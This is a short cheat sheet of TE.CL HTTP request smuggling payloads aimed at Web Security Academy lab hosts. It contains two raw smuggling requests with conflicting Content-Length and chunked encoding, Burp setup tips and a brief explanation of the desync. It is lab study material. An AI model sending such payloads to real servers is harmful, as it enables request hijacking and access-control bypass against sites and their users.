# TE.CL Payloads

> For authorized labs and testing environments only.

## Basic TE.CL desync

Disable automatic `Content-Length` updating in Burp Repeater.

```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

```

The final `0` must be followed by the required CRLF sequence.

## Differential-response pattern

```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

5e
POST /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

```

## Quick reminder

- **TE.CL** = front end uses `Transfer-Encoding`.
- Back end uses `Content-Length`.
- Incorrect request boundaries can leave part of the body to be interpreted as another request.
